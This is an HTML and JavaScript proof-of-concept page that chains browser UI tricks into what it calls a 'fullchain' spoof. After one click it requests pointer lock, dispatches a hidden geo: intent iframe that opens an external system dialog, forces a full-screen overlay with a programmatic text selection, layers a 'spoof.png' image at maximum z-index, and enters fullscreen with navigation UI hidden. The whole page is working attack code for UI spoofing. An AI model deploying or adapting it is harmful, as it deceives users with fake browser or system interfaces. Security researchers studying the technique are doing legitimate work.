<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
    <title>Advanced Selection Overlap & Fullchain PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        width: 100%;
        background: #0b0e14;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f0f6fc;
        display: flex;
        align-items: center;
        justify-content: center;
        overflow: hidden;
      }
      #fullscreenElement {
        position: relative;
        width: 100%;
        height: 100%;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; z-index: 10; }
      button {
        width: 100%;
        max-width: 360px;
        padding: 18px 24px;
        font-size: 16px;
        font-weight: 600;
        background: #da3633;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
        transition: transform 0.1s, background 0.2s;
      }
      button:active { background: #b62324; transform: scale(0.98); }
      .info {
        margin-top: 20px;
        font-size: 13px;
        color: #8b949e;
        font-family: monospace;
        word-break: break-all;
        padding: 0 10px;
        user-select: text; /* Memungkinkan seleksi teks pada elemen info */
      }
      #spoof {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        min-width: 100vw;
        min-height: 100vh;
        object-fit: cover;
        z-index: 2147483647;
        pointer-events: none;
      }
      #pointerLockElement {
        width: 1px;
        height: 1px;
        position: absolute;
        opacity: 0;
      }
      /* Lapisan Seleksi Teks Overlap Palsu */
      #selectionOverlapLayer {
        position: absolute;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        background: rgba(11, 14, 20, 0.85);
        z-index: 2147483646;
        display: none;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        user-select: text;
        -webkit-user-select: text;
        padding: 20px;
        box-sizing: border-box;
      }
      .overlap-text {
        font-size: 14px;
        color: #3fb950;
        font-family: monospace;
        background: #161b22;
        border: 1px solid #30363d;
        padding: 15px;
        border-radius: 8px;
        max-width: 500px;
        width: 100%;
        text-align: left;
        box-shadow: 0 8px 24px rgba(0,0,0,0.5);
      }
    </style>
    <script>
      addEventListener("touchstart", (event) => {});
      window.ontouchstart = (event) => {
        let input = document.getElementById("focusInput");
        if (input) input.focus();
      };
      
      addEventListener("touchend", (event) => {});
      window.ontouchend = (event) => {
        let input = document.getElementById("focusInput");
        if (input) input.blur();
      };
    </script>
  </head>
  <body>
    <input id="focusInput" style="width: 0px; height: 0px; border: none; outline: none; background: transparent; position: absolute; opacity: 0;" />

    <div id="pointerLockElement"></div>

    <div id="fullscreenElement">
      <!-- Visual Image Spoof Layer -->
      <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">

      <!-- Selection Overlap Text Layer -->
      <div id="selectionOverlapLayer">
        <div class="overlap-text" id="overlapContent">
          [SECURE_CONTEXT_OVERLAP_ACTIVE]<br>
          Target DOM Selection Overlap initialized successfully.<br>
          Status: Forcing context focus and text selection manipulation...
        </div>
      </div>

      <div class="container" id="mainContainer">
        <button id="execBtn">INITIALIZE SELECTION OVERLAP CHAIN</button>
        <div class="info" id="statusInfo">Status: Ready for interaction.</div>
      </div>
    </div>

    <script>
      let execButton = document.getElementById("execBtn");
      let statusInfo = document.getElementById("statusInfo");

      execButton.onclick = async function () {
        statusInfo.innerText = "Status: Executing selection overlap & chaining sequence...";
        this.style.display = "none";

        try {
          // 1. Pointer Lock Integration
          let plElement = document.getElementById("pointerLockElement");
          if (plElement && plElement.requestPointerLock) {
            await plElement.requestPointerLock().catch((err) => {
              console.debug("PointerLock chained catch:", err.message);
            });
          }

          // 2. Intent URI Dispatcher (geo: schema) untuk memicu dialog sistem eksternal
          let spoofFrame = document.createElement("iframe");
          spoofFrame.style.display = "none";
          spoofFrame.src = "geo:0,0?q=apple.com";
          document.body.appendChild(spoofFrame);

          // 3. Mengaktifkan Selection Overlap Layer & Manipulasi Rentang Seleksi DOM
          let overlapLayer = document.getElementById("selectionOverlapLayer");
          if (overlapLayer) {
            overlapLayer.style.display = "flex";
            
            // Programmatically force text selection overlap range
            let overlapContent = document.getElementById("overlapContent");
            if (overlapContent && window.getSelection) {
              let range = document.createRange();
              range.selectNodeContents(overlapContent);
              let selection = window.getSelection();
              selection.removeAllRanges();
              selection.addRange(range);
            }
          }

          // 4. Deployment Visual Spoof Layer
          let spoofImg = document.getElementById("spoof");
          if (spoofImg) {
            spoofImg.style.display = "block";
          }

          statusInfo.innerText = "Status: Selection overlap deployed. Engaging Fullscreen lock...";

          // 5. Eksekusi Fullscreen Agresif Berantai
          setTimeout(async () => {
            let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
            
            let requestFS = fsElement.requestFullscreen || 
                            fsElement.webkitRequestFullscreen || 
                            fsElement.mozRequestFullScreen || 
                            fsElement.msRequestFullscreen;

            if (requestFS) {
              try {
                await requestFS.call(fsElement, { navigationUI: "hide" });
              } catch (err) {
                try {
                  await requestFS.call(fsElement);
                } catch (e) {
                  console.debug("Fullscreen chain fallback error:", e.message);
                }
              }
            }

            let container = document.getElementById("mainContainer");
            if (container) {
              container.style.display = "none";
            }
            
            statusInfo.innerText = "Status: Selection overlap & fullchain active.";
          }, 300);

        } catch (err) {
          statusInfo.innerText = "Status: Chaining execution error: " + err.message;
          execButton.style.display = "block";
        }
      };
    </script>
  </body>
</html>
